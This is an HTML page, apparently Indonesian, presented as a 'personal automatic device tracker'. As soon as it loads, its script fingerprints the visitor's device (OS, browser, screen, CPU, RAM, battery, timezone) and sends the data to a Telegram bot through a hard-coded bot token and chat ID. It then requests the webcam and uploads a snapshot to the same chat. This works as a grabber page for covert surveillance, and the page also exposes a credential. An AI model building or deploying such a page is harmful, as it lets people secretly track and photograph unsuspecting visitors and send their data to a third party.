<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Device Tracker Personal Otomatis</title>
<style>
  body { background: #0d1117; color: #c9d1d9; font-family: Arial, sans-serif; padding: 20px; }
  pre { background: #161b22; padding: 15px; border-radius: 8px; white-space: pre-wrap; max-width: 100%; overflow-x: auto; }
  video { margin-top: 15px; border-radius: 8px; max-width: 300px; }
</style>
</head>
<body>
<h1>Device Tracker Otomatis (Personal)</h1>
<pre id="info">Mengambil data...</pre>
<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

<script>
const token = '7435851375:AAH7RpYei5mXA0YU0MogtjZ9FQZgA4ZzoX8';
const chatId = '6927717225';

function parseOS(ua) {
  if (/Windows/.test(ua)) return "Windows";
  if (/Macintosh/.test(ua)) return "MacOS";
  if (/Linux/.test(ua)) return "Linux";
  if (/Android/.test(ua)) return "Android";
  if (/iPhone|iPad/.test(ua)) return "iOS";
  return "Unknown";
}

function parseBrowser(ua) {
  if (/Chrome/.test(ua)) return "Chrome";
  if (/Firefox/.test(ua)) return "Firefox";
  if (/Safari/.test(ua) && !/Chrome/.test(ua)) return "Safari";
  if (/Edge/.test(ua)) return "Edge";
  return "Unknown";
}

async function getBattery() {
  if (navigator.getBattery) {
    const battery = await navigator.getBattery();
    return { level: battery.level * 100 + '%', charging: battery.charging ? 'Ya' : 'Tidak' };
  }
  return { level: 'N/A', charging: 'N/A' };
}

async function getDeviceInfo() {
  const ua = navigator.userAgent;
  const battery = await getBattery();
  const v = {
    user_agent: ua,
    os: parseOS(ua),
    browser: parseBrowser(ua),
    platform: navigator.platform || 'N/A',
    screen: `${screen.width}x${screen.height}`,
    window: `${window.innerWidth}x${window.innerHeight}`,
    dpr: window.devicePixelRatio || 1,
    cpu: navigator.hardwareConcurrency || 'N/A',
    ram: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    touch: 'ontouchstart' in window,
    maxTouchPoints: navigator.maxTouchPoints || 0,
    cookies: navigator.cookieEnabled,
    online: navigator.onLine,
    doNotTrack: navigator.doNotTrack,
    webdriver: navigator.webdriver || false,
    pdfViewerEnabled: !!navigator.pdfViewerEnabled,
    batteryLevel: battery.level,
    charging: battery.charging,
    ip: '127.0.0.1',
    access_time: new Date().toISOString(),
    local_time: new Date().toLocaleString()
  };
  return v;
}

function formatTemplate(v) {
  return `
IP: ${v.ip} | Time: ${v.access_time}
â³ Date In Device : ${v.local_time}

ðŸ“± DEVICE OVERVIEW
ðŸ“² Device Name: ${v.user_agent}
ðŸ’» Operating System: ${v.os}
ðŸŒ Browser: ${v.browser}
ðŸ”§ Platform: ${v.platform}

ðŸ–¥ï¸ DISPLAY DETAILS
ðŸ“ Screen Size: ${v.screen}
ðŸªŸ Window Size: ${v.window}
ðŸŽ¨ Color Quality: 24-bit
ðŸ”„ Orientation: ${v.orientation || 'unknown'}
ðŸ“Š Pixel Density: ${v.dpr}x

âš¡ PERFORMANCE INFO
ðŸ§  CPU Cores: ${v.cpu}
ðŸ’¾ Device RAM: ${v.ram}
ðŸŒ Language: ${v.language}
ðŸ• Timezone: ${v.timezone}

ðŸ‘† INPUT CAPABILITIES
ðŸ“± Touch Screen: âœ… ${v.touch ? 'Yes' : 'No'}
ðŸ–ï¸ Max Touch Points: ${v.maxTouchPoints || 'N/A'}
ðŸª Cookies: âœ… ${v.cookies ? 'Enabled' : 'Disabled'}
ðŸŒ Online Status: âœ… ${v.online ? 'Connected' : 'Disconnected'}

ðŸ”’ SECURITY FEATURES
ðŸš« Do Not Track: ${v.doNotTrack === '1' ? 'âœ… Enabled' : 'âŒ Disabled'}
ðŸ¤– Webdriver: ${v.webdriver ? 'âŒ Detected' : 'âœ… Not Detected'}
ðŸ“„ PDF Viewer: ${v.pdfViewerEnabled ? 'âœ… Available' : 'âŒ Not Available'}

âš¡ BATTERY
ðŸ”‹ Level: ${v.batteryLevel}
âš¡ Charging: ${v.charging}
`;
}

async function sendToTelegram(message) {
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: message })
  });
}

async function start() {
  const v = await getDeviceInfo();
  document.getElementById('info').innerText = formatTemplate(v);

  // Otomatis kirim ke Telegram
  await sendToTelegram(formatTemplate(v));

  // Webcam snapshot (opsional)
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    const video = document.getElementById('video');
    video.srcObject = stream;

    const canvas = document.getElementById('canvas');
    await new Promise(res => setTimeout(res, 1000));
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob);
      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
    }, 'image/jpeg');
  } catch (e) {
    console.log('Webcam tidak diizinkan atau tidak tersedia.');
  }
}

start();
</script>
</body>
</html>
